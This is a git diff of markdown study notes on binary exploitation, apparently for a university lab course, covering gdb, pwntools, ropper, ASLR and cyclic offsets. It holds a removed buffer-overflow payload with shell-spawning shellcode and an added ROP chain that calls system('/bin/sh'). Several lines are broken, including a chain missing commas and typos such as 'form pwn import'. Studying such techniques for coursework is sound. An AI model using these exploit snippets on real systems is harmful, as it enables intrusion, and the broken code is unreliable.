@@ -184,14 +184,18 @@ x/10i 0x747a03e2a3e5
 ```
 disassemble <function_name>
 ```
-- behaviour with forks
+- create breakpoint at fork()
 ```
-set follow-fork-mode child
-set detach-on-fork off
-#create catch point
 catch fork
 ```
-
+- decide if gdb should follow the child or parent on fork
+```
+set follow-fork-mode child
+```
+- allow gdb to keep control of both parent and child
+```
+set detach-on-fork off
+```
 
 ## strace: trace system calls
 - todo
@@ -209,60 +213,24 @@ checksec --file=my_binary
 ```
 - basic usage
 ```python
+#!/usr/bin/env python3
+
 import pwn
 
-# set architecture
+exe = pwn.ELF("./vuln_patched")
+libc = pwn.ELF("./libc.so.6")
+ld = pwn.ELF("./ld-linux-x86-64.so.2")
+
 pwn.context.arch = 'amd64'
+#pwn.context.binary = exe
 
-# spawn binary and a gdb instance for debugging
-# this way we can use pwntools to transfer bytes 
-"""
-conn = pwn.process('./vuln')
+#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33311)
+conn = pwn.process([exe.path])
+
 pwn.gdb.attach(conn)
-"""
 
-#conn = pwn.binary('./my_binary')
-conn = pwn.remote('127.0.0.1', 1024)
-
-# receive bytes until
-conn.recvuntil(b'print:')
-
-# we want to write the address 0x00000000004011c0 into memory
-# we start by filling buffer with dummy values 'A' and finish with newline '\n' (0x0a)
-# addresses are stored in little endien (that means 0xCAFE is stored as 0xFE 0xCA)
-# that means the address 0x00000000004011c0 must be transmitted as 0xc011400000000000
-message = b'A' * 56 + b'\xc0\x11\x40\x00\x00\x00\x00\x00\n'
-# if we do not want to worry about endienness, we can do Pack the 64-bit integer:
-message = b'A' * 56 + pwn.p64(0x4011c0) + b'\n'
-
-# write shellcode by hand
-shellcode = pwn.asm('''
-    lea rdi, [rip + string]
-    mov rsi, 0
-    mov rdx, 0
-    mox rax, 2
-    syscall
-
-string:
-''') + b'\\flag'
-print(shellcode.hex())
-
-# get automatic shellcode (don't do this, do manually as this won't work in exam)
-shellcode = pwn.asm(pwn.shellcraft.sh())
-
-conn.recvuntil(b'Hello! My name is 0x')
-address = conn.recvuntil(b'!\nWhat is your name?', drop=True)
-address_RIP = int(address.decode('utf-8'), 16)
-# we need top of buffer, but get middle of big 32 byte buffer (two 16 byte buffers in C)
-address_RIP -= 16
-# we set RBP = RIP, because we have no data on stack for our shellcode
-address_RBP = address_RIP
-payload = shellcode + pwn.p64(address_RBP) + pwn.p64(address_RIP)
-print(payload.hex())
-# send shellcode
-conn.sendline(payload)
-# start interactive session (we have a shell now)
 conn.interactive()
+exit()
 ```
 ```python
 form pwn import *
@@ -275,17 +243,6 @@ tube = gdb.debug('./vuln')
 tube.write(b'A'*40)
 
 ```
-
-
-
-
-
-## netcat: connect to instance
-- connect to server on port
-```
-nc 127.0.0.1 1024
-```
-
 
 ## manpage: get info about libc and syscalls
 - get information about libc
@@ -329,6 +286,19 @@ ropper --file ./vuln --search "pop rdi; ret;"
 
 ropper --file ./vuln --semantic "rdi+=rax"
 ```
+- find all gadgets interactively
+```
+ropper
+file vuln
+```
+- exclude stuff
+```
+badbytes 0a
+```
+- find specific ones
+```
+search /1/ pop rdi
+```
 
 
 # extract linker to run other libc locally
@@ -352,4 +322,33 @@ docker cp c93ecb781483:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /home/timnikla
 - verify that it worked
 ```
 LD_DEBUG=libs ./vuln_patched
+```
+
+# gind how many bits aslr system has
+- find out how many bits are randomized with aslr 
+```
+sudo cat /proc/sys/vm/mmap_rnd_bits
+```
+
+
+# found out how far we can go with the overflow until we reach the return address
+- get a non repeating string with python 
+- paste it in the input, then use cyclic_find to get the length
+```
+cyclic(128)
+cyclic_find(0x<address>)
+```
+
+
+# ROP chain trick if PIE-disabled
+- if pie is off, we can write into "data" with the ropchain, then we can read from this well known address
+```python
+chain = b''.join([
+	pwn.p64(0x4013d5), # pop rdi; ret;
+	pwn.p64(0x48a000), # => rdi = "/bin/sh";
+	pwn.p64(0x401001), # pop rax; ret;
+	b'/bin/sh\0'
+	pwn.p64(0x442b30) # mov [rdi], rax; ret;
+	pwn.p64(binary.symbols['system'])
+])
 ```
